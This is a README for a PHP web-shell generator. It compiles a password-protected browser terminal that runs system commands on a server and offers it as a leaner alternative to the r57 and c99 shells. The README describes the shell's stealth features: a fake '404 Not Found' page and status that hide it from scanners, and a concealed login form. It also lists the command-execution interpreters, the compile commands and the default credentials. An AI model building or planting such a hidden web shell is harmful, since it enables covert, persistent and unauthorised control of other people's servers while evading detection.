# PHP-Shell Generator

[PHP-Shell Generator](http://www.cixtor.com/phpshell) is a simple web terminal developed using a simple class in `PHP`, `jQuery` and the plugin `jQuery.Terminal` developed by **Jakub Jankiewicz** at [Terminal.jCubic](http://terminal.jcubic.pl/). This tool was created looking for speed, simplicity flexibility and anonimity, rather than using `r57` or `c99` (the most common php-shell in the world) I prefer to use an interface with only the essential tools and customizable.

This project has a pseudo-compiler tool that will let you customize the php-shell, I will add more options and methods when I get more ideas for the development, at this moment you can customize the `username` and `password` used to log into the shell, the `filename` of the compiled file and the default `shell interpreter` used to execute the commands switching between the functions `system, shell_exec, passthru, exec`.

Also in the compiled php-shell you will have some methods to change the interpreter once you are logged in to be flexible when you are executing commands, and a way to dynamically change the current working directory using sessions instead of GET parameters.

### Compilation

The compilation process consists basically in replace some lines of the template with the customizable data provided by the tool like the password or the shell interpreter, adding the libraries jQuery and jQuery.Terminal to implement the web terminal interface, reducing the tabular characters and newlines to finally get a php-shell of more or less `130K`.

![cixtor phpshellgen compilation](http://www.cixtor.com/files/large/phpshell-generator-1.png)

### 404 Not Found

When you use this shell the first time you will see a page saying that the file was not found in the server, and even if you send a `HEAD` request to the URL where the shell was uploaded, you will see a HTTP status code like this: `HTTP/1.1 404 Not Found`. But don't be afraid, the shell is there, just hiding to other people and shell scanners without privileges to access the file. Use `CTRL + U` to check the source code or the document inspector of your web browser using `F12`.

![cixtor phpshellgen 404](http://www.cixtor.com/files/large/phpshell-generator-2.png)

You can find the login form pressing one time the key `TAB`, this will guide you to the field where you can type the `username` and pressing the tabular key one more time will guide you to the `password` field. You can send the form pressing `Enter`, if it doesn't works use the document inspector of your web browser to find the Submit button and remove the style that set the property `display = none`.

![cixtor phpshellgen login](http://www.cixtor.com/files/large/phpshell-generator-3.png)

### Options

| Parameters        | Description                                            | Default                                         |
| ----------------- | ------------------------------------------------------ | ------------------------------------------------|
| `-h / --help`     | Print this message with the list of available options. |                                                 |
| `-i / --input`    | Specify the shell template to compile.                 | Official `cixtor/phpshellgen` repository        |
| `-o / --output`   | Specify the filename for the compiled shell.           | `cixtor.phpshellgen.php`                        |
| `-s / --shell`    | Specify the default PHP interpreter.                   | Modificable through `set_interpreter(passthru)` |
| `-u / --username` | Specify the username to log into the php-shell.        | `cixtor`                                        |
| `-p / --password` | Specify the password to log into the php-shell.        | `98ogHDPcPU`                                    |
| `-l / --lint`     | Enable the PHP linter on the compiled shell.           | `False`                                         |

### Methods

| Method                    | Description                                                    |
| ------------------------- | -------------------------------------------------------------- |
| `set_interpreter`         | Set the default PHP interpreter: `set_interpreter(shell_exec)` |
| `get_interpreter`         | Get the current PHP interpreter                                |
| `get_disabled_functions`  | Get the list of functions disabled through a `php.ini` file    |
| `logout`                  | Close the current shell session.                               |
| `cd 'folder/path'`        | Change the current working directory.                          |

### Usage

```
$ ./compile.rb -i template.php -o shell.php
$ ./compile.rb -i template.php -s 'passthru'
$ ./compile.rb -i template.php -o shell.php -u 'USERNAME' -p 'PASSWORD'
```

![cixtor phpshellgen example](http://www.cixtor.com/files/large/phpshell-generator-4.png)

### License

[Cixtor PHP-Shell Generator](http://www.cixtor.com/) uses the [BSD 3-Clause "New" or "Revised" license](http://opensource.org/licenses/BSD-3-Clause).